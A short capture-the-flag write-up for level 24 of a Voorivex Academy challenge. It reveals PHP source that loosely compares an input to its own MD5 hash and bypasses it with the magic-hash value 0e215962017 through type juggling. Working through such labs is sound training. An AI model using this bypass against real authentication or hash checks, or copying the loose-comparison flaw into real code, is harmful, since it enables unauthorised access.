# Level-24

Level24-25 (https://matrix.voorivex.academy/the-final-fight-f570a4b62b398c60db1b49599024f3aa)

send this request:

```text
https://matrix.voorivex.academy/the-final-fight-f570a4b62b398c60db1b49599024f3aa/?show-me-the-codes
```

you will get a php code:

```php
<?php
if (isset($_GET['show-me-the-codes'])) {
    show_source("index.php");
    exit();
}

if (isset($_GET['code'])) {
    if (md5($_GET['code']) == $_GET['code']) {
        require_once("next.php");
        die($next);
    }
}

?>
```


we need to find a value which is equal to its md5 hash value,
after a lot of searching i came across this [link](https://github.com/bl4de/ctf/blob/master/2017/HackDatKiwi_CTF_2017/md5games1/md5games1.md)
and the value `0e215962017` works fine, so send this request:

```text
curl https://matrix.voorivex.academy/the-final-fight-f570a4b62b398c60db1b49599024f3aa/?code=0e215962017

/the-final-fight-4dba54234d41bc0bbe7c7a8193f22a61
```

now go to:

```text
https://matrix.voorivex.academy/the-final-fight-4dba54234d41bc0bbe7c7a8193f22a61
```
